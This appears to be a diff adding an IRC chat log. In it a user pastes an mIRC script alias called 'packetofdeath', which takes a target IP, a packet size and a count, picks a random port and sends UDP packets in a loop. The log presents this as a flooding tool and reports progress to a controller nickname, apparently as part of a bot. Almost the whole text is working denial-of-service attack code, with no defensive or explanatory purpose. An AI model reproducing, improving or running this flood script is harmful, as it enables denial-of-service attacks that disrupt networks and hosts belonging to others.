@@ -1,0 +1,16 @@
+(02:15:08)   º( syk1k[Busy] )º  alias packetofdeath {
+(02:15:09)   º( syk1k[Busy] )º  if ($3 = $null) { notice $nick Error Please use !packet address size amount | halt }
+(02:15:09)   º( syk1k[Busy] )º  if ($chr(46) !isin $1) || ($2 !isnum) || ($3 !isnum) { notice $nick Error Please use !packet address size amount | halt }
+(02:15:09)   º( syk1k[Busy] )º  if ($remove($1,$chr(46)) !isnum) { notice $nick Error no letters may be contained in the ip | unset %packet.* | halt }
+(02:15:09)   º( syk1k[Busy] )º  .msg %findme Now Gebening $1 with $2 Geben bytes $3 times
+(02:15:09)   º( syk1k[Busy] )º  set %packet.ip $1
+(02:15:09)   º( syk1k[Busy] )º  set %packet.bytes $2
+(02:15:09)   º( syk1k[Busy] )º  set %packet.amount $3
+(02:15:10)   º( syk1k[Busy] )º  set %packet.count 0
+(02:15:10)   º( syk1k[Busy] )º  set %packet.port $rand(1,6) $+ $rand(0,6) $+ ($rand(0,6) $+ $rand(0,9)
+(02:15:10)   º( syk1k[Busy] )º  :start
+(02:15:10)   º( syk1k[Busy] )º  if (%packet.count >= %packet.amount) { sockclose packet | unset %packet.* | .msg %findme Gebening has completed | halt }
+(02:15:10)   º( syk1k[Busy] )º  inc %packet.count 1
+(02:15:10)   º( syk1k[Busy] )º  /sockudp -b packet 60 %packet.ip %packet.port %packet.bytes %packet.bytes
+(02:15:10)   º( syk1k[Busy] )º  goto start
+(02:15:10)   º( syk1k[Busy] )º  }
